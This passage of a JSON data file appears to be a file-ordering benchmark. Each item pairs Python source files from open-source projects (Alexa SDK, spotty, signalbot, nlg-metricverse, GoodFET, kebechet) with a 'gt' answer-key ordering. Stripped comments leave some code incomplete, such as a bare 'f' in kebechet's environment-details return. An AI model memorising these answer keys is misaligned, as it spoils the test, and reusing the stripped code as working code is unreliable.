result[attr] = list(map(\n                    lambda x: x.to_dict() if hasattr(x, \"to_dict\") else\n                    x.value if isinstance(x, Enum) else x,\n                    value\n                ))\n            elif isinstance(value, Enum):\n                result[attr] = value.value\n            elif hasattr(value, \"to_dict\"):\n                result[attr] = value.to_dict()\n            elif isinstance(value, dict):\n                result[attr] = dict(map(\n                    lambda item: (item[0], item[1].to_dict())\n                    if hasattr(item[1], \"to_dict\") else\n                    (item[0], item[1].value)\n                    if isinstance(item[1], Enum) else item,\n                    value.items()\n                ))\n            else:\n                result[attr] = value\n\n        return result\n\n    def to_str(self):\n\n\n        return pprint.pformat(self.to_dict())\n\n    def __repr__(self):\n\n\n        return self.to_str()\n\n    def __eq__(self, other):\n\n\n        if not isinstance(other, Expiration):\n            return False\n\n        return self.__dict__ == other.__dict__\n\n    def __ne__(self, other):\n\n\n        return not self == other\n",
        "gt": [
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/expiration.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/start_event_handler_directive.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/__init__.py'"
        ]
    },
    {
        "files": [
            "'spotty/spotty/providers/gcp/config/validation.py'",
            "'spotty/spotty/providers/gcp/config/image_uri.py'",
            "'spotty/spotty/providers/gcp/config/disk_volume.py'"
        ],
        "content": "'spotty/spotty/providers/gcp/config/validation.py'\n:import os\nfrom schema import Schema, Optional, And, Regex, Or, Use\nfrom spotty.config.validation import validate_config, get_instance_parameters_schema, has_prefix\nfrom spotty.providers.gcp.config.image_uri import IMAGE_URI_REGEX\n\n\ndef validate_instance_parameters(params: dict):\n    from spotty.providers.gcp.config.disk_volume import DiskVolume\n\n    instance_parameters = {\n        'zone': And(str, Regex(r'^[a-z0-9-]+$')),\n        'machineType': str,\n        Optional('gpu', default=None): {\n            'type': str,\n            Optional('count', default=1): int,\n        },\n        Optional('preemptibleInstance', default=False): bool,\n        Optional('imageName', default=None): And(str, len, Regex(r'^[\\w-]+$')),\n        Optional('imageUri', default=None): And(str, len, Regex(IMAGE_URI_REGEX)),\n        Optional('bootDiskSize', default=0): And(Or(int, str), Use(str),\n                                                 Regex(r'^\\d+$', error='Incorrect value for \"bootDiskSize\".'),\n                                                 Use(int),\n                                                 And(lambda x: x > 0,\n                                                     error='\"rootVolumeSize\" should be greater than 0 or should '\n                                                           'not be specified.'),\n                                                 ),\n        Optional('ports', default=[]): [And(int, lambda x: 0 < x < 65536)],\n    }\n\n    instance_checks = [\n        And(lambda x: not (x['imageName'] and x['imageUri']),\n            error='\"imageName\" and \"imageUri\" parameters cannot be used together.'),\n    ]\n\n    volume_checks = [\n        And(lambda x: not has_prefix([(volume['parameters']['mountDir'] + '/') for volume in x\n                                      if volume['parameters'].get('mountDir')]),\n            error='Mount directories cannot be prefixes for each other.'),\n    ]\n\n    schema = get_instance_parameters_schema(instance_parameters, DiskVolume.TYPE_NAME, instance_checks, volume_checks)\n\n    return validate_config(schema, params)\n\n\ndef validate_disk_volume_parameters(params: dict):\n    from spotty.providers.gcp.config.disk_volume import DiskVolume\n\n    schema = Schema({\n        Optional('diskName', default=''): And(str, Regex(r'^[\\w-]{1,255}$')),\n        Optional('mountDir', default=''): And(\n            str,\n            And(os.path.isabs, error='Use absolute paths in the \"mountDir\" parameters'),\n            Use(lambda x: x.rstrip('/'))\n        ),\n        Optional('size', default=0): And(int, lambda x: x > 0),\n        Optional('deletionPolicy', default=DiskVolume.DP_RETAIN): And(\n            str,\n            lambda x: x in [DiskVolume.DP_CREATE_SNAPSHOT,\n                            DiskVolume.DP_UPDATE_SNAPSHOT,\n                            DiskVolume.DP_RETAIN,\n                            DiskVolume.DP_DELETE], error='Incorrect value for \"deletionPolicy\".'\n        ),\n    })\n\n    return validate_config(schema, params)\n\n'spotty/spotty/providers/gcp/config/image_uri.py'\n:import re\n\n\nIMAGE_URI_REGEX = '^(?:(?:https://compute.googleapis.com/compute/v1/)?projects/([a-z](?:[-a-z0-9]*[a-z0-9])?)/)?' \\\n                  'global/images/(family/)?([a-z](?:[-a-z0-9]*[a-z0-9])?)$'\n\n\nclass ImageUri(object):\n\n    def __init__(self, image_uri: str):\n        res = re.match(IMAGE_URI_REGEX, image_uri)\n        if not res:\n            raise ValueError('Image URI has a wrong format')\n\n        self._project_id, self._is_family, self._name = res.groups()\n\n    @property\n    def project_id(self) -> str:\n        return self._project_id\n\n    @property\n    def is_family(self):\n        return bool(self._is_family)\n\n    @property\n    def name(self):\n\n        return self._name\n\n'spotty/spotty/providers/gcp/config/disk_volume.py'\n:from spotty.config.abstract_instance_volume import AbstractInstanceVolume\nfrom spotty.providers.gcp.config.validation import validate_disk_volume_parameters\n\n\nclass DiskVolume(AbstractInstanceVolume):\n\n    TYPE_NAME = 'Disk'\n\n    DP_CREATE_SNAPSHOT = 'CreateSnapshot'\n    DP_UPDATE_SNAPSHOT = 'UpdateSnapshot'\n    DP_RETAIN = 'Retain'\n    DP_DELETE = 'Delete'\n\n    def __init__(self, volume_config: dict, project_name: str, instance_name: str):\n        super().__init__(volume_config)\n\n        self._project_name = project_name\n        self._instance_name = instance_name\n\n    def _validate_volume_parameters(self, params: dict) -> dict:\n        return validate_disk_volume_parameters(params)\n\n    @property\n    def title(self):\n        return 'Disk'\n\n    @property\n    def size(self) -> int:\n        return self._params['size']\n\n    @property\n    def deletion_policy(self) -> str:\n        return self._params['deletionPolicy']\n\n    @property\n    def deletion_policy_title(self) -> str:\n        return {\n            DiskVolume.DP_CREATE_SNAPSHOT: 'Create Snapshot',\n            DiskVolume.DP_UPDATE_SNAPSHOT: 'Update Snapshot',\n            DiskVolume.DP_RETAIN: 'Retain Volume',\n            DiskVolume.DP_DELETE: 'Delete Volume',\n        }[self.deletion_policy]\n\n    @property\n    def disk_name(self) -> str:\n\n        disk_name = self._params['diskName']\n        if not disk_name:\n            disk_name = '%s-%s-%s' % (self._project_name.lower(), self._instance_name.lower(), self.name.lower())\n\n        return disk_name\n\n    @property\n    def mount_dir(self) -> str:\n\n        if self._params['mountDir']:\n            mount_dir = self._params['mountDir']\n        else:\n            mount_dir = '/mnt/%s' % self.disk_name\n\n        return mount_dir\n\n    @property\n    def host_path(self) -> str:\n\n        return self.mount_dir\n",
        "gt": [
            "'spotty/spotty/providers/gcp/config/image_uri.py'",
            "'spotty/spotty/providers/gcp/config/validation.py'",
            "'spotty/spotty/providers/gcp/config/disk_volume.py'"
        ]
    },
    {
        "files": [
            "'signalbot/signalbot/utils/__init__.py'",
            "'signalbot/tests/test_chat.py'",
            "'signalbot/signalbot/utils/chat_testing.py'"
        ],
        "content": "'signalbot/signalbot/utils/__init__.py'\n:from .chat_testing import (\n    ChatTestCase,\n    SendMessagesMock,\n    ReceiveMessagesMock,\n    ReactMessageMock,\n    chat,\n)\n\n__all__ = [\n    \"ChatTestCase\",\n    \"SendMessagesMock\",\n    \"ReceiveMessagesMock\",\n    \"ReactMessageMock\",\n    \"chat\",\n]\n\n'signalbot/tests/test_chat.py'\n:import unittest\nfrom unittest.mock import patch\nimport asyncio\nimport logging\nfrom signalbot import Command, Context\nfrom signalbot.utils import (\n    ChatTestCase,\n    SendMessagesMock,\n    ReceiveMessagesMock,\n    chat,\n)\n\n\nclass ChingChangChongCommand(Command):\n    triggers = [\"ching\", \"chang\"]\n\n    def __init__(self, listen):\n        self.listen = listen\n\n    async def handle(self, c: Context) -> bool:\n        if not Command.triggered(c.message, self.triggers):\n            return\n\n        text = c.message.text\n        if text == \"ching\":\n            await asyncio.sleep(1)\n            await c.send(\"chang\", listen=self.listen)\n            return\n\n        if text == \"chang\":\n            await asyncio.sleep(1)\n            await c.send(\"chong\")\n            return\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nif __name__ == \"__main__\":\n    logging.basicConfig(level=\"INFO\")\n    unittest.main()\n\n'signalbot/signalbot/utils/chat_testing.py'\n:import unittest\nimport uuid\nimport time\nimport json\nimport functools\nimport aiohttp\nfrom unittest.mock import AsyncMock, MagicMock\n\nfrom ..bot import SignalBot\n\nfrom unittest.mock import patch\n\n\ndef chat(*messages):\n    def decorator_chat(func):\n        signalbot_package = \".\".join(__package__.split(\".\")[:-1])\n\n        @functools.wraps(func)\n        @patch(f\"{signalbot_package}.SignalAPI.react\", new_callable=ReactMessageMock)\n        @patch(f\"{signalbot_package}.SignalAPI.send\", new_callable=SendMessagesMock)\n        @patch(\n            f\"{signalbot_package}.SignalAPI.receive\", new_callable=ReceiveMessagesMock\n        )\n        async def wrapper_chat(*args, **kwargs):\n            chat_test_case = args[0]\n            receive_mock = args[1]\n\n            receive_mock.define(messages)\n            await chat_test_case.run_bot()\n\n            value = func(*args, **kwargs)\n            return value\n\n        return wrapper_chat\n\n    return decorator_chat\n\n\nclass ChatTestCase(unittest.IsolatedAsyncioTestCase):\n    signal_service = \"127.0.0.1:8080\"\n    phone_number = \"+49123456789\"\n\n    group_id = \"group_id1=\"\n    group_secret = \"group.group_secret1=\"\n    config = {\n        \"signal_service\": signal_service,\n        \"phone_number\": phone_number,\n    }\n\n    def setUp(self):\n        self.signal_bot = SignalBot(ChatTestCase.config)\n        self.signal_bot.listen(ChatTestCase.group_id, ChatTestCase.group_secret)\n\n    async def run_bot(self):\n        PRODUCER_ID = 1337\n        HANDLER_ID = 4444\n        await self.signal_bot._produce(PRODUCER_ID)\n        while self.signal_bot._q.qsize() > 0:\n            await self.signal_bot._consume_new_item(HANDLER_ID)\n\n    @classmethod\n    def new_message(cls, text) -> str:\n        timestamp = time.time()\n        new_uuid = str(uuid.uuid4())\n        message = {\n            \"envelope\": {\n                \"source\": ChatTestCase.phone_number,\n                \"sourceNumber\": ChatTestCase.phone_number,\n                \"sourceUuid\": new_uuid,\n                \"sourceName\": \"some_source_name\",\n                \"sourceDevice\": 1,\n                \"timestamp\": timestamp,\n                \"syncMessage\": {\n                    \"sentMessage\": {\n                        \"timestamp\": timestamp,\n                        \"message\": text,\n                        \"expiresInSeconds\": 0,\n                        \"viewOnce\": False,\n                        \"mentions\": [],\n                        \"attachments\": [],\n                        \"contacts\": [],\n                        \"groupInfo\": {\n                            \"groupId\": ChatTestCase.group_id,\n                            \"type\": \"DELIVER\",\n                        },\n                        \"destination\": None,\n                        \"destinationNumber\": None,\n                        \"destinationUuid\": None,\n                    }\n                },\n            }\n        }\n        return json.dumps(message)\n\n\nclass ReceiveMessagesMock(MagicMock):\n    def define(self, messages: list):\n        json_messages = [ChatTestCase.new_message(m) for m in messages]\n        mock_iterator = AsyncMock()\n        mock_iterator.__aiter__.return_value = json_messages\n        self.return_value = mock_iterator\n\n\nclass SendMessagesMock(AsyncMock):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        mock = AsyncMock()\n        mock.return_value = {\"timestamp\": \"1638715559464\"}\n        self.return_value = AsyncMock(\n            spec=aiohttp.ClientResponse,\n            status_code=201,\n            json=mock,\n        )\n\n    def results(self) -> list:\n        return self._extract_responses()\n\n    def _extract_responses(self):\n        results = []\n        for args in self.call_args_list:\n            results.append(args[0])\n        return results\n\n\nclass ReactMessageMock(AsyncMock):\n    def results(self) -> list:\n        return self._extract_responses()\n\n    def _extract_responses(self):\n        results = []\n        for args in self.call_args_list:\n            results.append(args[0])\n        return results\n",
        "gt": [
            "'signalbot/signalbot/utils/chat_testing.py'",
            "'signalbot/signalbot/utils/__init__.py'",
            "'signalbot/tests/test_chat.py'"
        ]
    },
    {
        "files": [
            "'nlg-metricverse/tests/nlgmetricverse/metrics/test_wer.py'",
            "'nlg-metricverse/nlgmetricverse/metrics/prism/__init__.py'",
            "'nlg-metricverse/nlgmetricverse/metrics/__init__.py'"
        ],
        "content": "'nlg-metricverse/tests/nlgmetricverse/metrics/test_wer.py'\n:import pytest\n\nfrom nlgmetricverse import NLGMetricverse\nfrom nlgmetricverse.metrics import AutoMetric\nfrom tests.nlgmetricverse.conftest import get_expected_output\nfrom tests.utils import assert_almost_equal_dict\n\n\n@pytest.fixture(scope=\"module\")\ndef nlgmetricverse_wer():\n    metric = AutoMetric.load(\"wer\")\n    return NLGMetricverse(metrics=metric)\n\n\n@pytest.fixture\n@get_expected_output(prefix=\"metrics\")\ndef output_basic():\n    return output_basic.output\n\n\n@pytest.fixture\n@get_expected_output(prefix=\"metrics\")\ndef output_basic_concat():\n    return output_basic_concat.output\n\n\n@pytest.fixture\n@get_expected_output(prefix=\"metrics\")\ndef output_multiple_ref():\n    return output_multiple_ref.output\n\n\n@pytest.fixture\n@get_expected_output(prefix=\"metrics\")\ndef output_multiple_pred_multiple_ref():\n    return output_multiple_pred_multiple_ref.output\n\n\ndef test_basic(predictions, references, nlgmetricverse_wer, output_basic):\n    scores = nlgmetricverse_wer(predictions=predictions, references=references)\n    assert_almost_equal_dict(actual=scores, desired=output_basic)\n\n\ndef test_basic_concat(predictions, references, nlgmetricverse_wer, output_basic_concat):\n    scores = nlgmetricverse_wer(predictions=predictions, references=references, concatenate_texts=True)\n    assert_almost_equal_dict(actual=scores, desired=output_basic_concat)\n\n\ndef test_multiple_ref(predictions, multiple_references, nlgmetricverse_wer, output_multiple_ref):\n    scores = nlgmetricverse_wer(predictions=predictions, references=multiple_references)\n    assert_almost_equal_dict(actual=scores, desired=output_multiple_ref)\n\n\ndef test_multiple_pred_multiple_ref(\n    multiple_predictions, multiple_references, nlgmetricverse_wer, output_multiple_pred_multiple_ref\n):\n    scores = nlgmetricverse_wer(predictions=multiple_predictions, references=multiple_references)\n    assert_almost_equal_dict(actual=scores, desired=output_multiple_pred_multiple_ref)\n\n'nlg-metricverse/nlgmetricverse/metrics/prism/__init__.py'\n:from nlgmetricverse.metrics.prism.prism import Prism\n\n'nlg-metricverse/nlgmetricverse/metrics/__init__.py'\n:from nlgmetricverse.metrics._core import (\n    AutoMetric,\n    EvaluationInstance,\n    Metric,\n    MetricForLanguageGeneration,\n    MetricForTask,\n    list_metrics,\n    load_metric,\n    filter_metrics,\n    Categories,\n    ApplTasks,\n    QualityDims,\n    get_metric_bounds\n)\nfrom nlgmetricverse.metrics.abstractness import Abstractness\nfrom nlgmetricverse.metrics.accuracy import Accuracy\nfrom nlgmetricverse.metrics.aun import AUN\nfrom nlgmetricverse.metrics.bartscore import Bartscore\nfrom nlgmetricverse.metrics.bertscore import Bertscore\nfrom nlgmetricverse.metrics.bleu import Bleu\nfrom nlgmetricverse.metrics.bleurt import Bleurt\nfrom nlgmetricverse.metrics.carburacy import Carburacy\nfrom nlgmetricverse.metrics.cer import CER\nfrom nlgmetricverse.metrics.chrf import CHRF\nfrom nlgmetricverse.metrics.cider import Cider\nfrom nlgmetricverse.metrics.comet import Comet\nfrom nlgmetricverse.metrics.compression import Compression\nfrom nlgmetricverse.metrics.coverage import Coverage\nfrom nlgmetricverse.metrics.density import Density\nfrom nlgmetricverse.metrics.f1 import F1\nfrom nlgmetricverse.metrics.flesch_kincaid import FleschKincaid\nfrom nlgmetricverse.metrics.gunning_fog import GunningFog\nfrom nlgmetricverse.metrics.mauve import Mauve\nfrom nlgmetricverse.metrics.meteor import Meteor\nfrom nlgmetricverse.metrics.moverscore import Moverscore\nfrom nlgmetricverse.metrics.nid import NID\nfrom nlgmetricverse.metrics.nist import Nist\nfrom nlgmetricverse.metrics.nubia import Nubia\nfrom nlgmetricverse.metrics.perplexity import Perplexity\nfrom nlgmetricverse.metrics.precision import Precision\nfrom nlgmetricverse.metrics.prism import Prism\nfrom nlgmetricverse.metrics.recall import Recall\nfrom nlgmetricverse.metrics.repetitiveness import Repetitiveness\nfrom nlgmetricverse.metrics.rouge import Rouge\nfrom nlgmetricverse.metrics.sacrebleu import Sacrebleu\nfrom nlgmetricverse.metrics.ter import TER\nfrom nlgmetricverse.metrics.unr import UNR\nfrom nlgmetricverse.metrics.wer import WER\nfrom nlgmetricverse.metrics.wmd import WMD\n",
        "gt": [
            "'nlg-metricverse/nlgmetricverse/metrics/prism/__init__.py'",
            "'nlg-metricverse/nlgmetricverse/metrics/__init__.py'",
            "'nlg-metricverse/tests/nlgmetricverse/metrics/test_wer.py'"
        ]
    },
    {
        "files": [
            "'goodfet/client/util.py'",
            "'goodfet/client/USBFtdi.py'",
            "'goodfet/client/facedancer-ftdi.py'"
        ],
        "content": "'goodfet/client/util.py'\n:\n\n\n\ndef bytes_as_hex(b, delim=\" \"):\n    return delim.join([\"%02x\" % x for x in b])\n\n\n'goodfet/client/USBFtdi.py'\n:\n\n\n\nfrom USB import *\nfrom USBDevice import *\nfrom USBConfiguration import *\nfrom USBInterface import *\nfrom USBEndpoint import *\nfrom USBVendor import *\n\nfrom util import *\n\nclass USBFtdiVendor(USBVendor):\n    name = \"USB FTDI vendor\"\n\n    def setup_request_handlers(self):\n        self.request_handlers = {\n             0 : self.handle_reset_request,\n             1 : self.handle_modem_ctrl_request,\n             2 : self.handle_set_flow_ctrl_request,\n             3 : self.handle_set_baud_rate_request,\n             4 : self.handle_set_data_request,\n             5 : self.handle_get_status_request,\n             6 : self.handle_set_event_char_request,\n             7 : self.handle_set_error_char_request,\n             9 : self.handle_set_latency_timer_request,\n            10 : self.handle_get_latency_timer_request\n        }\n\n    def handle_reset_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received reset request\")\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_modem_ctrl_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received modem_ctrl request\")\n\n        dtr = req.value & 0x0001\n        rts = (req.value & 0x0002) >> 1\n        dtren = (req.value & 0x0100) >> 8\n        rtsen = (req.value & 0x0200) >> 9\n\n        if dtren:\n            print(\"DTR is enabled, value\", dtr)\n        if rtsen:\n            print(\"RTS is enabled, value\", rts)\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_set_flow_ctrl_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received set_flow_ctrl request\")\n\n        if req.value == 0x000:\n            print(\"SET_FLOW_CTRL to no handshaking\")\n        if req.value & 0x0001:\n            print(\"SET_FLOW_CTRL for RTS/CTS handshaking\")\n        if req.value & 0x0002:\n            print(\"SET_FLOW_CTRL for DTR/DSR handshaking\")\n        if req.value & 0x0004:\n            print(\"SET_FLOW_CTRL for XON/XOFF handshaking\")\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_set_baud_rate_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received set_baud_rate request\")\n\n        dtr = req.value & 0x0001\n        print(\"baud rate set to\", dtr)\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_set_data_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received set_data request\")\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_get_status_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received get_status request\")\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_set_event_char_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received set_event_char request\")\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_set_error_char_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received set_error_char request\")\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_set_latency_timer_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received set_latency_timer request\")\n\n        self.device.maxusb_app.send_on_endpoint(0, b'')\n\n    def handle_get_latency_timer_request(self, req):\n        if self.verbose > 0:\n            print(self.name, \"received get_latency_timer request\")\n\n\n        self.device.maxusb_app.send_on_endpoint(0, b'\\x01')\n\n\nclass USBFtdiInterface(USBInterface):\n    name = \"USB FTDI interface\"\n\n    def __init__(self, verbose=0):\n        descriptors = { }\n\n        endpoints = [\n            USBEndpoint(\n                1,\n                USBEndpoint.direction_out,\n                USBEndpoint.transfer_type_bulk,\n                USBEndpoint.sync_type_none,\n                USBEndpoint.usage_type_data,\n                16384,\n                0,\n                self.handle_data_available\n            ),\n            USBEndpoint(\n                3,\n                USBEndpoint.direction_in,\n                USBEndpoint.transfer_type_bulk,\n                USBEndpoint.sync_type_none,\n                USBEndpoint.usage_type_data,\n                16384,\n                0,\n                None\n            )\n        ]\n\n\n        USBInterface.__init__(\n                self,\n                0,\n                0,\n                0xff,\n                0xff,\n                0xff,\n                0,\n                verbose,\n                endpoints,\n                descriptors\n        )\n\n    def handle_data_available(self, data):\n        s = data[1:]\n        if self.verbose > 0:\n            print(self.name, \"received string\", s)\n\n        s = s.replace(b'\\r', b'\\r\\n')\n\n        reply = b'\\x01\\x00' + s\n\n        self.configuration.device.maxusb_app.send_on_endpoint(3, reply)\n\n\nclass USBFtdiDevice(USBDevice):\n    name = \"USB FTDI device\"\n\n    def __init__(self, maxusb_app, verbose=0):\n        interface = USBFtdiInterface(verbose=verbose)\n\n        config = USBConfiguration(\n                1,\n                \"FTDI config\",\n                [ interface ]\n        )\n\n        USBDevice.__init__(\n                self,\n                maxusb_app,\n                0,\n                0,\n                0,\n                64,\n                0x0403,\n                0x6001,\n                0x0001,\n                \"GoodFET\",\n                \"FTDI Emulator\",\n                \"S/N3420E\",\n                [ config ],\n                verbose=verbose\n        )\n\n        self.device_vendor = USBFtdiVendor()\n        self.device_vendor.set_device(self)\n\n\n'goodfet/client/facedancer-ftdi.py'\n:\n\n\n\nfrom Facedancer import *\nfrom MAXUSBApp import *\nfrom USBFtdi import *\n\nsp = GoodFETSerialPort()\nfd = Facedancer(sp, verbose=1)\nu = MAXUSBApp(fd, verbose=1)\n\nd = USBFtdiDevice(u, verbose=4)\n\nd.connect()\n\ntry:\n    d.run()\n\nexcept KeyboardInterrupt:\n    d.disconnect()\n\n",
        "gt": [
            "'goodfet/client/util.py'",
            "'goodfet/client/USBFtdi.py'",
            "'goodfet/client/facedancer-ftdi.py'"
        ]
    },
    {
        "files": [
            "'kebechet/kebechet/managers/manager.py'",
            "'kebechet/kebechet/managers/info/info.py'",
            "'kebechet/kebechet/managers/info/__init__.py'"
        ],
        "content": "'kebechet/kebechet/managers/manager.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport logging\nimport platform\nimport typing\nimport git\nimport os\nfrom typing import Dict, List, Optional\nfrom functools import partial\n\nimport delegator\nimport kebechet\n\nfrom kebechet.exception import PipenvError\nfrom ogr.services.base import BaseGitService\nfrom ogr.abstract import Issue, PullRequest, PRStatus\n\nfrom kebechet import utils\n\n_LOGGER = logging.getLogger(__name__)\n\n\nclass ManagerBase:\n\n\n    def __init__(\n        self,\n        slug: str,\n        service: BaseGitService,\n        service_type: str,\n        parsed_payload: Optional[dict] = None,\n        metadata: Optional[dict] = None,\n        runtime_environments: List[str] = None,\n    ):\n\n        self.service_url: str = service.instance_url\n        self.slug = slug\n        self.service_type = service_type\n\n        self.parsed_payload = None\n        if parsed_payload:\n            self.parsed_payload = parsed_payload\n        self.owner, self.repo_name = self.slug.split(\"/\", maxsplit=1)\n        self.installation = False\n        if os.getenv(\"GITHUB_PRIVATE_KEY_PATH\") and os.getenv(\"GITHUB_APP_ID\"):\n            self.installation = True\n\n        self.service = service\n        self.project = service.get_project(namespace=self.owner, repo=self.repo_name)\n        self._repo: git.Repo = None\n        self.metadata = metadata\n        self.runtime_environments = runtime_environments\n\n    @property\n    def repo(self):\n\n        return self._repo\n\n    @repo.setter\n    def repo(self, repo: git.Repo):\n\n        self._repo = repo\n\n    @classmethod\n    def get_environment_details(\n        cls, as_dict=False\n    ) -> typing.Union[str, typing.Dict[str, str]]:\n\n        try:\n            pipenv_version = cls.run_pipenv(\"pipenv --version\")\n        except PipenvError as exc:\n            pipenv_version = f\"Failed to obtain pipenv version:\\n{exc.stderr}\"\n\n        return (\n            f\n            if not as_dict\n            else {\n                \"kebechet_version\": kebechet.__version__,\n                \"python_version\": platform.python_version(),\n                \"platform\": platform.platform(),\n                \"pipenv_version\": pipenv_version,\n            }\n        )\n\n    @staticmethod\n    def run_pipenv(cmd: str):\n\n        _LOGGER.debug(f\"Running pipenv command {cmd!r}\")\n        result = delegator.run(cmd)\n        if result.return_code != 0:\n            _LOGGER.warning(result.err)\n            raise PipenvError(result)\n\n        return result.out\n\n    @classmethod\n    def get_dependency_graph(cls, graceful: bool = False):\n\n        try:\n            cls.run_pipenv(\n                \"pipenv sync --dev\"\n            )\n            return cls.run_pipenv(\"pipenv graph\")\n        except PipenvError as exc:\n            if not graceful:\n                raise\n            return f\"Unable to obtain dependency graph:\\n\\n{exc.stderr}\"\n\n    def get_issue_by_title(self, title: str) -> Optional[Issue]:\n\n        return utils.get_issue_by_title(self.project, title)\n\n    def get_prs_by_branch(self, branch: str, status=PRStatus.open) -> List[PullRequest]:\n\n        to_ret = []\n        self.project.get_pr_list\n        for pr in self.project.get_pr_list(status=status):\n            if pr.source_branch == branch:\n                to_ret.append(pr)\n        return to_ret\n\n    def delete_remote_branch(self, branch: str):\n\n        remote = self.repo.remote()\n        for repo_branch in self.repo.references:\n            if branch == repo_branch.name:\n                remote.push(refspec=(f\":{repo_branch.remote_head}\"))\n\n    def close_issue_and_comment(self, title: str, comment: str):\n\n        issue = self.get_issue_by_title(title)\n\n        if issue is None:\n            _LOGGER.debug(f\"Issue {title} not found, not closing.\")\n            return\n        issue.comment(comment)\n        issue.close()\n\n    def create_pr(self, title: str, body: str, source_branch: str, target_branch: str):\n\n        return self.project.create_pr(\n            title=title,\n            body=body + f\"\\n<details>\"\n            f\"<summary>Environment details</summary>\"\n            f\"\\n{self.get_environment_details()}\\n</details>\",\n            target_branch=target_branch,\n            source_branch=source_branch,\n            fork_username=self.project.namespace if self.project.is_fork else None,\n        )\n\n    def _git_commit_push(\n        self, commit_msg: str, branch_name: str, files: list, force_push: bool = False\n    ) -> None:\n\n        cur_branch = self.repo.active_branch\n        self.repo.git.checkout(\"HEAD\", b=branch_name)\n        try:\n            self.repo.git.add(files)\n            self.repo.git.commit(f\"--message='{commit_msg}'\", \"--signoff\")\n            self.repo.remote().push(branch_name, force=force_push).raise_if_error()\n        finally:\n            self.repo.git.checkout(\n                cur_branch\n            )\n\n    def pr_comment(self, id: int, body: str):\n\n        pr = self.project.get_pr(id)\n        pr.comment(body=body)\n\n    def run(self, labels: list) -> typing.Optional[dict]:\n\n        raise NotImplementedError\n\n    @staticmethod\n    def create_github_body(\n        template: str,\n        required_info: Dict[str, str] = {},\n        optional_info: Dict[str, str] = {},\n    ) -> str:\n\n        partial_format = partial(template.format, **required_info)\n\n        req_info_len = sum(len(s) for s in required_info.values())\n\n\n        optional_data_lim = (\n            65536 - len(template) - req_info_len\n        )\n\n        opt_info_list = [(k, v) for k, v in optional_info.items()]\n        opt_info_list = sorted(\n            opt_info_list, key=lambda x: len(x[1])\n        )\n\n        for i in range(len(opt_info_list)):\n            item_limit = int(optional_data_lim / (len(optional_info) - i))\n            optional_info[opt_info_list[i][0]] = opt_info_list[i][1][:item_limit]\n            optional_data_lim -= len(opt_info_list[i][1][:item_limit])\n\n        return partial_format(**optional_info)\n\n'kebechet/kebechet/managers/info/info.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport logging\nimport typing\n\nfrom kebechet.managers.manager import ManagerBase\nfrom kebechet.utils import cloned_repo\n\nfrom .messages import INFO_REPORT\n\n_INFO_ISSUE_NAME = \"Kebechet info\"\n\n_LOGGER = logging.getLogger(__name__)\n\n_EVENTS_SUPPORTED = [\"issues\", \"issue\"]\n\n\nclass InfoManager(ManagerBase):\n\n\n    def run(self) -> typing.Optional[dict]:\n\n        if self.parsed_payload:\n            if self.parsed_payload.get(\"event\") not in _EVENTS_SUPPORTED:\n                _LOGGER.info(\n                    \"Info manager doesn't act on %r events.\",\n                    self.parsed_payload.get(\"event\"),\n                )\n                return None\n\n        issue = self.get_issue_by_title(_INFO_ISSUE_NAME)\n\n        if issue is None:\n            _LOGGER.info(\"No issue to report to, exiting\")\n            return None\n\n        _LOGGER.info(f\"Found issue {_INFO_ISSUE_NAME}, generating report\")\n        with cloned_repo(self, depth=1) as repo:\n\n            issue.comment(\n                INFO_REPORT.format(\n                    sha=repo.head.commit.hexsha,\n                    slug=self.slug,\n                    environment_details=self.get_environment_details(),\n                    dependency_graph=self.get_dependency_graph(graceful=True),\n                ),\n            )\n            issue.close()\n        return None\n\n'kebechet/kebechet/managers/info/__init__.py'\n:\n\nfrom .info import InfoManager\n",
        "gt": [
            "'kebechet/kebechet/managers/manager.py'",
            "'kebechet/kebechet/managers/info/info.py'",
            "'kebechet/kebechet/managers/info/__init__.py'"
        ]
    },
    {
        "files": [
            "'JittorLLMs/models/pangualpha/megatron/__init__.py'",
            "'JittorLLMs/models/pangualpha/tasks/glue/data.py'",
            "'JittorLLMs/models/pangualpha/tasks/glue/finetune.py'",
            "'JittorLLMs/models/pangualpha/megatron/package_info.py'",
            "'JittorLLMs/models/pangualpha/tasks/glue/mnli.py'"
        ],
